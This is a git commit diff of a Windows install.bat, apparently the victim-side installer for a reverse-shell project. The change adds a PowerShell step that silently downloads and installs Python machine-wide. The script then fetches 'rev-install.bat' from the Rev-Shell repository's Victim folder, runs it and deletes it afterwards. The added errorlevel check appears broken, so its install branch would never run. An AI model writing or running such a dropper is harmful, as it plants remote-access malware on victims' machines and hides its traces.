8a082e269aada31a968e2ec1f36e959015849636
OrtwIn <bertil.braun.private@gmail.com>
2020-06-30 18:55:31 +0200

    Update install.bat

--- install.bat
+++ install.bat
@@ -1,5 +1,12 @@
 @echo off
 
+python --version 3>NUL
+if errorlevel 0 goto continue
+
+powershell -command "(New-Object Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.6.2/python-3.6.2.exe', 'C:/Tools/python-3.6.2.exe'); & c:\Tools\python-3.6.2.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 TargetDir=c:\Tools\Python362; [Environment]::SetEnvironmentVariable('PATH', ${env:path} + ';C:\Tools\Python362', 'Machine')"
+
+:continue
+
 powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/BertilBraun/Rev-Shell/master/Victim/rev-install.bat' -OutFile 'rev.bat'}"
 call rev.bat
 del rev.bat
